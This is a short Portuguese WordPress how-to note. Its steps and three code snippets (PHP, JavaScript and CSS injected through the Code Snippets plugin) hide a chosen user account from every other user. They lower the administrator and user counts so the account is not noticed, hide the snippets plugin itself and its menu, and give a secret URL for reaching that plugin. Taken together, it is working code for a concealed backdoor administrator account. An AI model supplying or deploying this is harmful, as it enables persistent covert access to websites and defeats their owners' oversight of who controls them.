---
tags:
  - wordpress
  - wordpress/dicas
---

1. Ir no menu adicionar usuário
2. Colocar nomes e senhas como quiser
3. Instalar o plugin code snippets
4. Usar código  1
	1. Isso faz com que o usuário suma, mas não faz com que a contagem mude
	2. Utilize o código 2.
	3. Mais um impedimento, o code snippets continua aparecendo
	4. Use o código 3.
	5. Para acessar coloque `<url>/?page=snippets`



### Código 1
```php
add_action('pre_user_query','site_pre_user_query');
function site_pre_user_query($user_search) {
global $current_user;
$username = $current_user->user_login;
if ($username == 'NOMEDOUSUARIOAQUI') {
}
else {
global $wpdb;
$user_search->query_where = str_replace('WHERE 1=1',
"WHERE 1=1 AND {$wpdb->users}.user_login != 'NOMEDOUSUARIOAQUI'",$user_search->query_where);
}
}
```
### Código 2
```PHP
add_filter("views_users", "site_list_table_views");
function site_list_table_views($views){
$users = count_users();
$admins_num = $users['avail_roles']['administrator'] - 1;
$all_num = $users['total_users'] - 1;
$class_adm = ( strpos($views['administrator'], 'current') === false ) ? "" : "current";
$class_all = ( strpos($views['all'], 'current') === false ) ? "" : "current";

$views['administrator'] = '' . translate_user_role('Administrator') . ' (' . $admins_num . ')';
$views['all'] = '' . __('All') . ' (' . $all_num . ')';
return $views;
}
```
### Código 3
```JavaScript
function my_custom_admin_script() {
    $current_screen = get_current_screen();
    if ($current_screen->base == 'plugins') {
        ?>
        <script type="text/javascript">
        document.addEventListener('DOMContentLoaded', function() {
            const todosCountSpan = document.querySelector('li.all .count');
            const ativosCountSpan = document.querySelector('li.active .count');
            const displayingNum = document.querySelector('.displaying-num');
            const atualizacaoAuto = document.querySelector(".auto-update-enabled");
            
            atualizacaoAuto.style.display = "none";

            if (todosCountSpan && ativosCountSpan && displayingNum) {
                const todosCount = parseInt(todosCountSpan.textContent.replace(/[^\d]/g, '')) - 1;
                const ativosCount = parseInt(ativosCountSpan.textContent.replace(/[^\d]/g, '')) - 1;

                todosCountSpan.textContent = `(${todosCount})`;
                ativosCountSpan.textContent = `(${ativosCount})`;
                
                const displayingNumCount = parseInt(displayingNum.textContent.replace(/[^\d]/g, '')) - 1;
                displayingNum.textContent = displayingNumCount + (displayingNumCount === 1 ? ' item' : ' itens');
            }
            
        });
        </script>
        <?php
    }
}
add_action('admin_footer', 'my_custom_admin_script');


add_action('admin_head', 'css_wordpress');

function css_wordpress() {
  echo '<style>
    #toplevel_page_snippets{
        display: none;
    }
    
    tr[data-slug="code-snippets"]{
        display: none;
    }
  </style>';
}
```